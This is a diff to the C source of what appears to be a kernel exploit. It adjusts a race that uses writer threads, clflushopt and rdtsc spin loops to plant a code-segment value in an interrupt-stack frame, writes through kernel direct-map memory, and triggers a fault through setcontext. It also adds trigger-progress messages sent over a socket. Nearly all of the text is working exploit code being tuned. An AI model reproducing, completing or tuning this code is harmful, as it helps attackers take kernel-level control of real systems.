@@ -4316,7 +4316,7 @@ broad_done:
         struct sigaction old_sigbus_act;
         int sigsegv_installed = 0;
         struct sigaction old_sigsegv_act;
-        #define NUM_GP_WRITERS 8
+        #define NUM_GP_WRITERS 4
         int writers_started = 0;
         thrd_t writer_threads[NUM_GP_WRITERS];
         stack_t old_sigalt;
@@ -6442,11 +6442,7 @@ broad_done:
                     :: "r"((void *)(istp + 0xFE0)) : "memory");
                 __asm__ volatile("sfence" ::: "memory");
 
-                /* Also write CS=0x43 through the kernel's DMAP
-                 * write path, ensuring the kernel's cache domain
-                 * has 0x43 in case user VA and DMAP VA go through
-                 * different cache hierarchies due to EPT. */
-                kernel_setlong(ist_dmap_va + 0xFE0, 0x43);
+                send_response(sock, "  [TRIG] pre-populate+clflush done\n");
 
                 /* Reset per-attempt state */
                 gp_trap_sig_received = 0;
@@ -6455,6 +6451,7 @@ broad_done:
                 gp_trap_ist_err = 0;
 
                 gp_trap_jmp_valid = 1; /* enable siglongjmp in handler */
+                send_response(sock, "  [TRIG] sigsetjmp...\n");
                 int jmp_rc = sigsetjmp(gp_trap_jmp_env, 1);
                 if (jmp_rc != 0) {
                     /* Returned from signal handler */
@@ -6536,6 +6533,8 @@ broad_done:
                         }
                     }
 
+                    send_response(sock, "  [TRIG] CPU check passed\n");
+
                     uint8_t uc_buf[2048] __attribute__((aligned(16)));
                     memset(uc_buf, 0, sizeof(uc_buf));
 
@@ -6592,12 +6591,13 @@ broad_done:
                      * (timer tick), so the actual delay could be
                      * 500µs to ~1.5ms.  RDTSC gives sub-µs precision.
                      *
-                     * Spin for ~500µs (1.75M cycles at 3.5GHz Zen 2
+                     * Spin for ~200µs (700K cycles at 3.5GHz Zen 2
                      * invariant TSC) using pause to yield pipeline
                      * resources to writer threads on the same core.
-                     * Extended from 100µs to give writers more time
-                     * to establish steady-state CS=0x43 in DRAM
-                     * (via clflushopt). */
+                     * Gives writers time to establish CS=0x43 in
+                     * DRAM (via clflushopt). */
+                    send_response(sock,
+                        "  [TRIG] writers active, spinning 200us...\n");
                     gp_trap_writer_active = 1;
                     {
                         unsigned int tsc_lo, tsc_hi;
@@ -6605,7 +6605,7 @@ broad_done:
                             : "=a"(tsc_lo), "=d"(tsc_hi));
                         uint64_t tsc_start =
                             ((uint64_t)tsc_hi << 32) | tsc_lo;
-                        uint64_t tsc_target = tsc_start + 1750000;
+                        uint64_t tsc_target = tsc_start + 700000;
                         do {
                             __asm__ volatile("pause");
                             __asm__ volatile("rdtsc"
@@ -6614,6 +6614,8 @@ broad_done:
                                   tsc_lo) < tsc_target);
                     }
 
+                    send_response(sock,
+                        "  [TRIG] spin done, calling setcontext\n");
                     setcontext((ucontext_t *)uc_buf);
 
                     /* setcontext returned — failed */
